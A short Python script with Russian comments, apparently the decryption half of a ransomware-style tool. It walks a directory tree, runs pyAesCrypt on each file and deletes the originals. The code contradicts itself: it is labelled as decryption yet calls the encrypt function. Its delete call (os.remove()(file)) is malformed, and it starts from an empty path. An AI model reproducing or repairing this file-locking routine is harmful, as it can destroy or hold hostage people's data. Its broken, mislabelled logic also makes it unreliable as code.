import pyAesCrypt
import os


#функция дешифрования 
def decryption(file, password):

    #задаем размер буфера 
    buffer_size = 512 * 1024 


    #вызываем метод дешифрования
    pyAesCrypt.encryptFile(
        str(file),
        str(os.path.splitext(file)[0]),
        password,
        buffer_size
    )

    print("[Файл '" + str(os.path.splitext(file)[0]) + "' зашифрован]")


    #удаляем исходный файл 
    os.remove()(file)


#функция сканирования директорий
def walking_by_dirs(dir, password):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)

        #если находим файл то дешифруем его 
        if os.path.isfile(path):
            try:
                decryption(path, password)
            except Exception as ex:
                print(ex)
        else:
            walking_by_dirs(path, password)



password = input("Введите пароль для шифрования: ")
walking_by_dirs("", password)